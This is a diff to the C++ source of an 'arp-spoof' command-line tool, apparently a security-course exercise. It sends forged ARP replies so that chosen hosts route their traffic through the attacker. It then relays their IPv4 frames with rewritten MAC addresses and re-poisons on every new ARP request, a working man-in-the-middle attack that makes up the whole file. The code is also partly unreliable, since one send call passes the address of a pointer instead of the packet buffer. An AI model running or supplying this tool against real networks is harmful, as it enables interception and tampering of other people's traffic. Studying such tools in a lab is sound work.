@@ -6,6 +6,7 @@
 #include <ifaddrs.h>
 #include <unistd.h>
 #include <algorithm>
+#include <map>
 
 
 #pragma pack(push, 1)
@@ -14,11 +15,11 @@ struct EthArpPacket final {
 	ArpHdr arp_;
 };
 #pragma pack(pop)
-
 struct IP_MAC{
     Ip ip_;
     Mac mac_;
 };
+
 
 void usage() {
     printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
@@ -179,43 +180,44 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
-    struct IP_MAC *sender_addr_arr;
-    struct IP_MAC *target_addr_arr;
-
-    sender_addr_arr = new IP_MAC[(argc-2) / 2];
-    target_addr_arr = new IP_MAC[(argc-2) / 2];
+    Mac *sender_addr_Mac;
+    sender_addr_Mac = new Mac[(argc-2) / 2];
+    std::map<Mac, IP_MAC> senderMac_target_Map;
 
     for(int i=0;i<argc-2;i++){
         if (i%2 == 0){
-            ret = resolve_mac(&((sender_addr_arr+i/2)->mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
-            sender_addr_arr[i/2].ip_ = Ip(argv[i+2]);
+            ret = resolve_mac(sender_addr_Mac+i/2, handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
                 fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                 return -1;
             }
         }
         else{
-            ret = resolve_mac(&((target_addr_arr+i/2)->mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
-            target_addr_arr[i/2].ip_ = Ip(argv[i+2]);
+            IP_MAC target;
+            ret = resolve_mac(&(target.mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
                 fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                 return -1;
             }
+            target.ip_ = Ip(argv[i+2]);
+            senderMac_target_Map.insert(std::pair<Mac, IP_MAC>(sender_addr_Mac[i/2], target));
         }
     }
 
     for(int i=2,j=0;i<argc;i=i+2,j++){
-        ret = sendARP_reply(handle, sender_addr_arr[j].mac_, attacker_mac, Ip(argv[i+1]), Ip(argv[i]));
+        ret = sendARP_reply(handle, sender_addr_Mac[j], attacker_mac, Ip(argv[i+1]), Ip(argv[i]));
         if (ret != 0){
             fprintf(stderr, "couldn't spoof %s to %s\n", argv[i], argv[i+1]);
         }
     }
 
     PEthHdr ethernet;
-    EthHdr sendethernet;
+    PArpHdr arp;
 
     struct pcap_pkthdr *header;
     const u_char *packet;
+    u_char *tmpPacket;
+    Mac *p;
 
     while(1){
         int res = pcap_next_ex(handle, &header, &packet);
@@ -224,29 +226,31 @@ int main(int argc, char *argv[]) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             break;
         }
+
         ethernet = (PEthHdr)packet;
-        if(ethernet->smac())
+        p = std::find(sender_addr_Mac, sender_addr_Mac+(argc-2)/2, ethernet->smac());
+        if(p == sender_addr_Mac+(argc-2)/2) continue;
+
         if(ethernet->type() == EthHdr::Ip4){
+            tmpPacket = new u_char[header->caplen];
+            memcpy(tmpPacket, packet, header->caplen);
+            ethernet = (PEthHdr)tmpPacket;
+            ethernet->dmac_ = senderMac_target_Map[ethernet->smac()].mac_;
+            ethernet->smac_ = attacker_mac;
+            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&tmpPacket), header->caplen);
+            if (res != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            }
+            delete[] tmpPacket;
 
         } else if (ethernet->type() == EthHdr::Arp){
-
+            arp = (PArpHdr)(packet + sizeof(*ethernet));
+            if (arp->op() != ArpHdr::Request) continue;
+            sendARP_reply(handle, *p, attacker_mac, senderMac_target_Map[arp->smac()].ip_, arp->sip());
         }
-
     }
 
-
-
-    /*while(1){
-        sleep(1);
-        for(int i=2,j=0;i<argc;i=i+2,j++){
-            ret = sendARP_reply(handle, sender_addr_arr[j].mac_, attacker_mac, Ip(argv[i+1]), Ip(argv[i]));
-            if (ret != 0){
-                fprintf(stderr, "couldn't spoof %s to %s\n", argv[i], argv[i+1]);
-            }
-        }
-    }*/
-
-    delete[] sender_addr_arr;
+    delete[] sender_addr_Mac;
     pcap_close(handle);
 }
 
